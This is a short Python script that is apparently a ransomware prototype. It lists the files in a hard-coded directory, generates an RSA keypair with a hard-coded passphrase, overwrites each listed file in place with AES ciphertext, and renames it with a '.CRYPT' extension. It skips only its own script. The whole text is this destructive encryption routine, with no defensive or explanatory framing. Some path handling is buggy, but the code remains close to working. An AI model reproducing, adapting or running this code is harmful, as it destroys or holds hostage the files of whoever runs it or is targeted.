import os
import sys
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

CODE = 'GreatPassword'
KEY = RSA.generate(2048)
data = b'Hello World!'
my_name = sys.argv[0]
path = 'R://Games//X'
files = os.listdir(path)


def get_RSA_keys():
    encrypted_key = KEY.exportKey(
        passphrase = CODE,
        pkcs = 8,
        protection = "scryptAndAES128-CBC"
    )

    with open('my_private_rsa_key.bin', 'wb') as f:
        f.write(encrypted_key)

    with open('my_rsa_public.pem', 'wb') as f:
        f.write(KEY.publickey().exportKey())

    #encypt_RSA(data)
    encypt_RSA()


def encypt_RSA():
    with open('encrypted_data.bin', 'wb') as out_file:
        recipient_key = RSA.import_key(
            open('my_rsa_public.pem').read()
        )

        session_key = get_random_bytes(16)

        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        #cipher_aes = AES.new(session_key, AES.MODE_EAX)

        for file in files:
            f = open(file, 'rb')
            data = f.read()
            f.close()
            cipher_aes = AES.new(session_key, AES.MODE_EAX)
            ciphertext, tag = cipher_aes.encrypt_and_digest(data)
            new_file = open(file, 'wb')
            new_file.write(cipher_aes.nonce)
            new_file.write(tag)
            new_file.write(ciphertext)
            new_file.close()
            new_name = file.split('.')[0] + '{}'.format('.CRYPT')
            os.rename(file, new_name)
        #out_file.write(cipher_aes.nonce)
        #out_file.write(tag)
        #out_file.write(ciphertext)
        
def main():
    if my_name in files:
        files.remove(my_name)
    get_RSA_keys()


if __name__ == '__main__':
    main()
